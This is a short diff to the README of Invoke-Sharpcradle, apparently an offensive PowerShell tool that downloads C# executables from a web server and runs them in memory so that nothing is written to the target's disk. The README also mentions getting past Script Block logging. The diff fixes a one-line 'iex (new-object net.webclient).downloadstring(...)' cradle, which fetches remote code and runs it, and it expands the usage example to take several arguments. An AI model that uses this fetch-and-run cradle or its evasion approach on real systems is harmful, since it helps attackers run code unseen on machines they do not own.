@@ -5,9 +5,8 @@ All I did here was to take the C# code from https://github.com/anthemtotheego/Sh
 
 Why? No executable on the target system hard disk. Powershell in memory, C# code in memory. To bypass Script Block logging further precautions have to be taken.
 
-`iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke
--Sharpcradle/master/Invoke-Sharpcradle.ps1')`
+`iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')`
 
-`Invoke-Sharpcradle -Uri WebserverURI -Arguments ExecutableArguments`
+`Invoke-Sharpcradle -Uri WebserverURI -Argument1 firstargument -Argument2 seccondargument -Argument3 thirdargument`
 
 ![alt text](https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.png)
